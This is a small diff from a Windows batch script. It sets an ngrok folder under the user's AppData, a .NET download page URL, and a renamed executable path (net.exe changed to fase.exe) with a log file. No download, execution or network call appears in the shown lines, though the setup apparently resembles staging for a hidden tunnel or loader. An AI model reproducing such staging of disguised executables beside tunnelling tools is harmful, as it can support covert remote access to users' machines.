@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 set "USER=%USERNAME%"
 set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
 set "URL=https://dotnet.microsoft.com/download/dotnet/thank-you/runtime-8.0.0-windows-x64-installer"
-set "FILE_PATH=%NGROK_DIR%\net.exe"
+set "FILE_PATH=%NGROK_DIR%\fase.exe"
 set "LOG_PATH=%NGROK_DIR%\nt.txt"
 
 if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
